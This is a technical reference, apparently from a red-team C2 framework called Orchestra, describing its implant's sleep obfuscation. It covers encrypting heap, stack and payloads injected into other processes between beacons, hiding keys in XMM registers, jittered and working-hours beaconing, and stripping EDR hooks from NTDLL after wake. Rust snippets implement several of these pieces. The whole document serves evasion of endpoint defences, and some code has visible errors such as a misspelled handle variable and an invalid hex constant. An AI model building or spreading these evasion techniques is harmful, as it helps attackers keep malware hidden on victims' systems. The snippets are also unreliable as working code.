# Sleep Obfuscation — Deep Dive

Complete reference for Orchestra's sleep obfuscation pipeline: memory region tracking, encryption/decryption flow, stack encryption, integrity verification, remote payload enrollment, key management, and performance characteristics.

---

## Overview

Sleep obfuscation encrypts the agent's memory while it sleeps between C2 beacons. This defeats memory scanning by EDR/AV products that scan process memory for signatures during idle periods. When the agent wakes, memory is decrypted and execution continues transparently.

### Key Properties

- **Algorithm**: XChaCha20-Poly1305 (authenticated encryption)
- **Key Storage**: XMM14/XMM15 SIMD registers (Windows x86_64)
- **Scope**: All registered heap allocations + thread stack
- **Integrity**: Poly1305 MAC verifies no tampering during sleep
- **Overhead**: ~2–5ms per sleep cycle for typical agent memory (~10MB)

---

## Sleep Cycle

```
                         Agent Main Loop
                              │
                    ┌─────────▼─────────┐
                    │  Execute Tasks    │
                    │  (memory is       │
                    │   decrypted)      │
                    └─────────┬─────────┘
                              │ All tasks done
                    ┌─────────▼─────────┐
                    │  Calculate Sleep  │
                    │  Duration         │
                    │  (base + jitter)  │
                    └─────────┬─────────┘
                              │
                    ┌─────────▼─────────┐
                    │  ┌──────────────┐ │
                    │  │ Sleep        │ │
                    │  │ Encryption   │ │
                    │  │ Pipeline     │ │
                    │  └──────┬───────┘ │
                    └─────────┼─────────┘
                              │
              ┌───────────────┼───────────────┐
              │               │               │
    ┌─────────▼──────┐ ┌─────▼──────┐ ┌──────▼─────────┐
    │ Encrypt Heap   │ │Encrypt Stack│ │Encrypt Remote  │
    │ Regions        │ │ Frames      │ │ Payloads       │
    └─────────┬──────┘ └─────┬──────┘ └──────┬─────────┘
              │               │               │
              └───────────────┼───────────────┘
                              │
                    ┌─────────▼─────────┐
                    │  Sleep Variant    │
                    │  ┌───────────────┐│
                    │  │ Cronus:       ││
                    │  │ NtSetTimer +  ││
                    │  │ NtWaitFor     ││
                    │  │ SingleObject  ││
                    │  ├───────────────┤│
                    │  │ Ekko:         ││
                    │  │ NtDelay       ││
                    │  │ Execution     ││
                    │  └───────────────┘│
                    └─────────┬─────────┘
                              │ Wake
                    ┌─────────▼─────────┐
                    │  ┌──────────────┐ │
                    │  │ Sleep        │ │
                    │  │ Decryption   │ │
                    │  │ Pipeline     │ │
                    │  └──────┬───────┘ │
                    └─────────┼─────────┘
                              │
              ┌───────────────┼───────────────┐
              │               │               │
    ┌─────────▼──────┐ ┌─────▼──────┐ ┌──────▼─────────┐
    │ Decrypt Heap   │ │Decrypt Stack│ │Decrypt Remote  │
    │ Regions        │ │ Frames      │ │ Payloads       │
    └─────────┬──────┘ └─────┬──────┘ └──────┬─────────┘
              │               │               │
              └───────────────┼───────────────┘
                              │
                    ┌─────────▼─────────┐
                    │  Integrity        │
                    │  Verification     │
                    └─────────┬─────────┘
                              │
                    ┌─────────▼─────────┐
                    │  Continue Loop    │
                    │  (beacon)         │
                    └───────────────────┘
```

---

## Memory Region Tracking

### Registration

All memory that should be encrypted during sleep must be registered with the sleep subsystem:

```rust
pub struct MemoryRegion {
    pub base: *mut u8,
    pub size: usize,
    pub region_type: RegionType,
}

pub enum RegionType {
    Heap,       // Standard heap allocation
    Stack,      // Thread stack frame
    Remote,     // Injected payload in another process
    Guarded,    // MemoryGuard-protected allocation
}
```

### Region Registry

The registry is a `Vec<MemoryRegion>` protected by a mutex:

```rust
static REGIONS: Lazy<Mutex<Vec<MemoryRegion>>> = Lazy::new(|| Mutex::new(Vec::new()));

pub fn register_region(base: *mut u8, size: usize, region_type: RegionType) {
    let mut regions = REGIONS.lock().unwrap();
    // Check for overlaps
    if !regions.iter().any(|r| {
        (base as usize) < (r.base as usize + r.size) &&
        (base as usize + size) > (r.base as usize)
    }) {
        regions.push(MemoryRegion { base, size, region_type });
    }
}

pub fn unregister_region(base: *mut u8) {
    let mut regions = REGIONS.lock().unwrap();
    regions.retain(|r| r.base != base);
}
```

### MemoryGuard Integration

`MemoryGuard::new(size)` automatically registers the allocation:

```rust
impl MemoryGuard {
    pub fn new(size: usize) -> Self {
        let layout = Layout::from_size_align(size, 8).unwrap();
        let ptr = unsafe { alloc(layout) };
        register_region(ptr, size, RegionType::Guarded);
        MemoryGuard { ptr, size, layout }
    }
}

impl Drop for MemoryGuard {
    fn drop(&mut self) {
        // Zero before freeing
        unsafe { ptr::write_bytes(self.ptr, 0, self.size); }
        unregister_region(self.ptr);
        unsafe { dealloc(self.ptr, self.layout); }
    }
}
```

---

## Encryption/Decryption Flow

### Algorithm: XChaCha20-Poly1305

XChaCha20-Poly1305 is chosen over AES-GCM for sleep obfuscation because:

1. **No AES-NI dependency** — Works on older CPUs
2. **No side channels** — No lookup tables (unlike AES software implementations)
3. **Extended nonce** — 24-byte nonce allows random generation without collision risk
4. **Constant-time** — All operations are branch-free

### Encryption Format

Each region is encrypted with a unique nonce:

```
┌──────────────────┬────────────────────┬───────────────────────┐
│ nonce (24B)      │ ciphertext (N B)   │ tag (16B)             │
└──────────────────┴────────────────────┴───────────────────────┘
```

The ciphertext is written in-place over the plaintext region. The nonce and tag are stored in a temporary buffer that is zeroed after decryption.

### Encryption Process

```rust
fn encrypt_region(region: &MemoryRegion, key: &[u8; 32]) -> EncryptedRegion {
    let nonce: [u8; 24] = random();  // CSPRNG nonce per region per cycle
    let mut ciphertext = vec![0u8; region.size + 16];  // +16 for tag

    // Read current memory contents
    let plaintext = unsafe { std::slice::from_raw_parts(region.base, region.size) };

    // Encrypt in-place with XChaCha20-Poly1305
    let (ct, tag) = xchacha20poly1305::encrypt(key, &nonce, plaintext);

    // Write ciphertext back to the region
    unsafe { ptr::copy_nonoverlapping(ct.as_ptr(), region.base, ct.len()); }

    EncryptedRegion { nonce, tag, base: region.base, size: region.size }
}
```

### Decryption Process

```rust
fn decrypt_region(encrypted: &EncryptedRegion, key: &[u8; 32]) -> Result<(), CryptoError> {
    // Read ciphertext from memory
    let ciphertext = unsafe { std::slice::from_raw_parts(encrypted.base, encrypted.size) };

    // Decrypt with authentication verification
    let plaintext = xchacha20poly1305::decrypt(
        key,
        &encrypted.nonce,
        ciphertext,
        &encrypted.tag,
    )?;

    // Write plaintext back to the region
    unsafe { ptr::copy_nonoverlapping(plaintext.as_ptr(), encrypted.base, plaintext.len()); }

    Ok(())
}
```

If authentication fails (tag mismatch), the region is left encrypted and an error is logged. This prevents use of tampered memory.

---

## Stack Encryption

The agent encrypts its own thread stack during sleep. This is critical because the stack contains return addresses, local variables, and function pointers that could be used for signature detection.

### Stack Frame Detection

```
High Address
┌──────────────────────┐
│  Thread Stack Top    │  ← Stack limit (from TIB/TEB)
│                      │
│  ┌────────────────┐  │
│  │ Uninitialized  │  │  ← Not encrypted (garbage data)
│  │ Stack Space    │  │
│  └────────────────┘  │
│  ┌────────────────┐  │
│  │ Active Stack   │  │  ← Encrypted (contains live data)
│  │ Frames         │  │
│  └────────────────┘  │
│  ┌────────────────┐  │
│  │ Sleep Function │  │  ← Not encrypted (in .text, not stack)
│  │ Stack Frame    │  │     but stack pointer is adjusted
│  └────────────────┘  │
│                      │
│  Stack Pointer (RSP) │  ← Current RSP
└──────────────────────┘
Low Address
```

### Stack Encryption Process

1. **Save current stack pointer** — RSP value before entering sleep
2. **Calculate encryptable range** — From current RSP to stack limit (excluding sleep function's own frame)
3. **Encrypt stack contents** — XChaCha20-Poly1305 over the active stack region
4. **Sleep** — `NtDelayExecution` with the calculated duration
5. **Decrypt stack contents** — Restore stack using saved nonce/tag
6. **Verify stack canary** — Check that the stack canary is intact after decryption

### Stack Canary

```rust
static STACK_CANARY: u64 = 0xDEADBEEF_CAFEBABE;

fn verify_stack_canary() -> bool {
    // The canary is placed at a known offset in the stack frame
    // If decryption was successful, the canary should match
    let canary_ptr = get_stack_canary_address();
    unsafe { *canary_ptr == STACK_CANARY }
}
```

---

## Integrity Verification

After decryption, the agent verifies the integrity of critical memory regions:

### Checksum Verification

```rust
struct RegionChecksum {
    base: *mut u8,
    size: usize,
    sha256: [u8; 32],  // Computed before sleep
}

fn verify_region_integrity(checksums: &[RegionChecksum]) -> bool {
    checksums.iter().all(|c| {
        let data = unsafe { std::slice::from_raw_parts(c.base, c.size) };
        let hash = sha256(data);
        hash == c.sha256
    })
}
```

### Verification Order

1. **Agent code** — `.text` section integrity (if not using self-reencode)
2. **Configuration** — `Config` struct in memory
3. **CryptoSession** — Encryption state
4. **Module registry** — Loaded plugin list
5. **Guarded allocations** — All `MemoryGuard`-protected regions

If any verification fails, the agent enters a degraded mode:
- Logs the integrity failure
- Continues with reduced functionality
- May trigger a re-registration with the server

---

## Key Management

### Key Generation

The sleep encryption key is derived from the agent's master key:

```rust
fn derive_sleep_key(master_key: &[u8; 32]) -> [u8; 32] {
    hkdf_sha256(master_key, b"orchestra-sleep-v1", b"sleep-encryption-key")
}
```

### Key Storage — XMM14/XMM15 (Windows x86_64)

On Windows x86_64, the 32-byte encryption key is stored in XMM SIMD registers:

```asm
; Store key in XMM14/XMM15
movaps  xmm14, [key_first_16_bytes]
movaps  xmm15, [key_last_16_bytes]

; ... sleep happens here ...

; Retrieve key from XMM14/XMM15
movaps  xmm0, xmm14
movaps  xmm1, xmm15
; xmm0:xmm1 = 32-byte key
```

**Why XMM registers?**

1. **Not in memory** — EDR memory scanners scan process memory, not CPU registers
2. **Survive NtDelayExecution** — Registers are preserved across syscall boundaries
3. **No API call needed** — Direct register access, no `VirtualQuery` or `ReadProcessMemory` trail
4. **Per-thread** — XMM registers are per-thread, so multiple threads can have different keys

### Key Rotation

The sleep key is rotated every 1000 cycles (configurable):

```rust
fn rotate_key(current_key: &[u8; 32], cycle: u64) -> [u8; 32] {
    let mut input = [0u8; 40];
    input[..32].copy_from_slice(current_key);
    input[32..40].copy_from_slice(&cycle.to_le_bytes());
    hkdf_sha256(&input, b"orchestra-key-rotate", b"new-sleep-key")
}
```

---

## Remote Payload Enrollment

Injected payloads in other processes are enrolled in the sleep cycle:

### Enrollment Protocol

```
1. Agent injects payload into target process
2. Agent creates a shared control region in target process:
   ┌────────────────────────────────┐
   │ magic: u32 (0x0RC4)           │
   │ state: u32 (Awake/Sleeping)   │
   │ nonce: [u8; 24]               │
   │ tag: [u8; 16]                 │
   │ payload_size: usize            │
   │ cycle_count: u64               │
   └────────────────────────────────┘
3. Agent calls MemoryGuard::register_remote(control_region, process_handle)
4. During each sleep cycle, the agent:
   a. Writes nonce + tag to control region via NtWriteVirtualMemory
   b. Sets state = Sleeping
   c. Reads control region after wake to check state
   d. If state != Awake, re-decrypts and retries
```

### Remote Encryption Process

```rust
fn encrypt_remote_payload(
    process_handle: HANDLE,
    control_region: *mut u8,
    key: &[u8; 32],
) -> Result<(), RemoteError> {
    // 1. Read payload size from control region
    let size = read_remote_usize(process_handle, control_region + offset_of!(payload_size));

    // 2. Read current payload bytes
    let payload_bytes = read_remote_bytes(process_handle, payload_base, size);

    // 3. Encrypt with XChaCha20-Poly1305
    let nonce: [u8; 24] = random();
    let (ct, tag) = xchacha20poly1305::encrypt(key, &nonce, &payload_bytes);

    // 4. Write encrypted payload back
    write_remote_bytes(process_handle, payload_base, &ct);

    // 5. Write nonce and tag to control region
    write_remote_bytes(process_header, control_region + offset_of!(nonce), &nonce);
    write_remote_bytes(process_handle, control_region + offset_of!(tag), &tag);

    // 6. Set state to Sleeping
    write_remote_u32(process_handle, control_region + offset_of!(state), SLEEPING);
}
```

---

## Sleep Timing

### Base Interval

The base sleep interval is configured in the malleable profile:

```toml
[global]
sleep_time = 60  # seconds
jitter = 37      # percent (0-100)
```

### Jitter Calculation

```rust
fn calculate_sleep_duration(base: u64, jitter: u8) -> Duration {
    let jitter_range = base * jitter as u64 / 100;
    let min = base - jitter_range;
    let max = base + jitter_range;
    let actual = min + (random::<u64>() % (max - min + 1));
    Duration::from_secs(actual)
}
```

With `sleep_time = 60` and `jitter = 37`:
- Min: `60 - 22 = 38` seconds
- Max: `60 + 22 = 82` seconds
- Each cycle randomly picks between 38–82 seconds

### Working Hours

The agent can be configured to only beacon during specific hours:

```rust
fn within_working_hours(now: DateTime<Local>, config: &WorkingHoursConfig) -> bool {
    let hour = now.hour() as u8;
    let day = now.weekday().num_days_from_monday() as u8;

    if !config.days.contains(&day) {
        return false;
    }

    hour >= config.start_hour && hour < config.end_hour
}
```

If outside working hours, the agent sleeps until the next working period (but still encrypts memory).

---

## Performance Characteristics

### Encryption Overhead

Benchmarks from `agent/benches/agent_benchmark.rs`:

| Region Size | Encrypt | Decrypt | Total |
|-------------|---------|---------|-------|
| 64 KB | 0.02 ms | 0.02 ms | 0.04 ms |
| 256 KB | 0.08 ms | 0.08 ms | 0.16 ms |
| 1 MB | 0.30 ms | 0.30 ms | 0.60 ms |
| 4 MB | 1.20 ms | 1.20 ms | 2.40 ms |
| 16 MB | 4.80 ms | 4.80 ms | 9.60 ms |

### Memory Overhead

| Component | Size |
|-----------|------|
| Region registry entry | 32 bytes per region |
| EncryptedRegion metadata | 48 bytes per region (nonce + tag + pointers) |
| Key in XMM registers | 0 bytes (CPU register) |
| Temporary encryption buffer | 16 bytes per region (tag) |

### Sleep Cycle Latency

Total overhead for a complete sleep cycle (encrypt → sleep → decrypt → verify):

| Total Registered Memory | Cycle Overhead |
|-------------------------|----------------|
| 1 MB | ~1 ms |
| 4 MB | ~3 ms |
| 10 MB | ~7 ms |
| 50 MB | ~30 ms |

This overhead is negligible compared to typical sleep durations (30–300 seconds).

---

## Troubleshooting

### Agent Crashes After Wake

1. **Stack canary mismatch** — Decryption failed or stack was modified during sleep
2. **Integrity verification failure** — Memory was modified by EDR during sleep
3. **Key corruption** — XMM registers were modified (unlikely but possible with debug registers)

### High Memory Usage

1. Check number of registered regions: `MemoryGuard::region_count()`
2. Each `MemoryGuard::new()` adds a region — ensure guards are dropped when no longer needed
3. Module loading adds regions — unload modules when done

### Sleep Cycle Takes Too Long

1. Reduce total registered memory
2. Check for memory leaks (regions registered but never unregistered)
3. Profile encryption time with `debug!("encrypt took {:?}", start.elapsed())`

### Remote Payload Not Waking

1. Verify control region is accessible: `NtReadVirtualMemory` test
2. Check that the target process is still alive
3. Verify the key in XMM14/XMM15 matches the key used for remote encryption
4. Check for handle leaks (agent may have lost the process handle)

---

## Post-Wake NTDLL Hook Re-Check (Step 12)

After the sleep decryption pipeline completes and integrity verification passes,
the agent performs an additional step to detect NTDLL hooks that EDR products may
have placed while the agent was dormant:

```
                    ┌─────────▼─────────┐
                    │  Integrity        │
                    │  Verification     │
                    └─────────┬─────────┘
                              │
                    ┌─────────▼─────────┐
                    │  Step 12: Post-   │
                    │  wake NTDLL hook  │
                    │  re-check         │
                    │  (maybe_unhook)   │
                    └─────────┬─────────┘
                              │
                    ┌─────────▼─────────┐
                    │ Hooks detected?   │
                    └────┬─────────┬────┘
                         │ Yes     │ No
                ┌────────▼───┐    │
                │ Full .text │    │
                │ re-fetch   │    │
                │ from       │    │
                │ \KnownDlls │    │
                └────────┬───┘    │
                         │        │
                ┌────────▼────────▼───┐
                │  Continue Loop      │
                │  (beacon)           │
                └─────────────────────┘
```

### Why this is needed

EDR products monitor for sleep obfuscation and may take advantage of the agent's
dormant period to inline-hook NTDLL syscall stubs. Without this check:

1. Agent wakes from sleep
2. Agent immediately calls `NtDelayExecution` (via a now-hooked stub) to schedule the next sleep
3. EDR intercepts the hooked syscall and gains visibility into agent behavior

The post-wake check ensures the agent detects and removes any hooks before resuming
normal operation.

### Implementation

```rust
// In sleep_obfuscation.rs, after decryption and integrity verification:
if cfg!(target_os = "windows") {
    crate::ntdll_unhook::maybe_unhook();
}
```

`maybe_unhook()` calls `are_syscall_stubs_hooked()` to inspect the first bytes of
23 critical syscall stubs. If any hooks are detected, a full `.text` section
re-fetch is performed from `\KnownDlls\ntdll.dll` (or disk fallback). After the
re-fetch, all SSNs are re-resolved and the syscall cache is invalidated.

---

## Feature Flags

| Flag | Effect |
|------|--------|
| `memory-guard` | Enables MemoryGuard and sleep obfuscation (default) |
| `direct-syscalls` | Uses NtDelayExecution via syscall instead of Sleep() |
| `self-reencode` | Adds .text section re-encoding to the sleep cycle |

---

## See Also

- [ARCHITECTURE.md](ARCHITECTURE.md) — Agent state machine and module initialization
- [INJECTION_ENGINE.md](INJECTION_ENGINE.md) — Injection techniques and remote enrollment
- [SECURITY.md](SECURITY.md) — OPSEC considerations
